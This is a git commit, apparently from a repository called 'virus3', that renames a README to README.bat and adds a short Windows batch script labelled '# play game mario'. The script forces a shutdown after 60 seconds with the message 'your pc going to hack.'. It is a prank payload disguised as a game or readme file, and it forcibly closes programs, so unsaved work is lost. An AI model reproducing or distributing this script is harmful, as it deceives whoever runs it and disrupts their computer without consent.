09a3c7f610435d892a16b64976d06aa546ae2ce1
Am@n Chouh@n <amanchouhan192@gmail.com>
2017-03-22 16:18:36 +0530

    Update and rename README.md to README.bat

---
+++ README.bat
@@ -0,0 +1,6 @@
+# play game mario 
+oooohhhhhhhh.. this type of file can shut your computer down
+
+@echo off
+echo Message here
+shutdown -s -f -t 60 -c "your pc going to hack."
--- README.md
+++
@@ -1,2 +0,0 @@
-# virus3
-oooohhhhhhhh...this type of file can shut down your pc
